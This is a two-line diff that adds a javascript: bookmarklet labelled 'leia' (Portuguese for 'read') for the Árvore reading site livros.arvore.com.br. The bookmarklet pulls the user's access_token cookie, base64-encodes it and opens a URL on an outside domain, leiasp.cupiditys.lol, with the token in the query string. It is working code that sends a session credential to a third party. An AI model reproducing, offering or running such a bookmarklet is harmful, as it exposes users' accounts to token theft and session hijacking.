@@ -1,0 +1,2 @@
+*leia*
+javascript:!function(){if('livros.arvore.com.br'!==location.host)return alert('Este script só funciona no Árvore!');open(`https://leiasp.cupiditys.lol/?key=${encodeURIComponent(btoa(document.cookie.split(%27access_token=%27)[1].split(%27;%27)[0]))}`)}();
